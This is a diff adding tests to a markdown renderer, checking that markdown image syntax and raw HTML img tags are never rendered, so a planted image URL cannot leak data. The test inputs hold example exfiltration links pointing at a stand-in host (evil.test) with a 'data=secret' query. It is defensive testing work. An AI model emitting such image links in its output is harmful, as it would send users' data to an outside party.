@@ -72,6 +72,20 @@ describe('code', () => {
   });
 });
 
+describe('images', () => {
+  it('never loads an image, so a planted image URL cannot leak data', () => {
+    const { container } = renderMd('Summary. ![x](https://evil.test/leak?data=secret) done.');
+    expect(container.querySelector('img')).toBeNull();
+    expect(container).toHaveTextContent('Summary.');
+    expect(container).toHaveTextContent('done.');
+  });
+
+  it('ignores raw HTML images as well', () => {
+    const { container } = renderMd('<img src="https://evil.test/leak?data=secret"> text');
+    expect(container.querySelector('img')).toBeNull();
+  });
+});
+
 describe('math', () => {
   it('renders inline $...$ with KaTeX', () => {
     const { container } = renderMd('Energy is $E = mc^2$ here');
